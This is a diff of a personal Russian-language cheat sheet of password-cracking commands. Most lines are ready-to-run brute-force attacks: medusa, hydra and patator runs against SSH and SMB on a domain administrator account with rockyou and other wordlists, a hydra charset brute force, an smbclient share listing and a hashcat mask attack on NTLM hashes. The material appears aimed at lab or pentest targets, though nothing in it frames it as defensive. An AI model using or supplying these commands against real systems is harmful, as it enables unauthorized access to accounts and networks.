@@ -9,6 +9,11 @@ medusa -h 192.168.50.38 -u michael -P rockyou.txt -M ssh -f -v 6
 
 (почему то для домена) hydra -P wifite.txt -l administrator smb://192.168.50.200 -m "ROOT.DC"
 
+
+!!!!Brute char!!!! -x min:max:Aa1%
+
+hydra -x 7:8:1 -l administrator smb://192.168.50.200 -m "ROOT.DC" -V
+
 метасплойт в метасплойт
 
 Перебор хешей по словарю
@@ -46,17 +51,8 @@ hashcat --force --hwmon-temp-abort=100 -m 1000 -D 1,2 -a 3 -i --increment-min 5 
  b | 0x00 - 0xff
 
 
-patator ssh_login host=10.8.0.14 user=john password=FILE0 0=/usr/share/wordlists/rockyou.txt -x ignore:mesg=’Authentication failed.’
 
 
-
-
-smbclient -L 192.168.50.200 -U Administrator
-
-
-Brute char!!!! -x min:max:Aa1%
-
-hydra -x 7:8:1 -l administrator smb://192.168.50.200 -m "ROOT.DC" -V
 
 
 Создание паролей
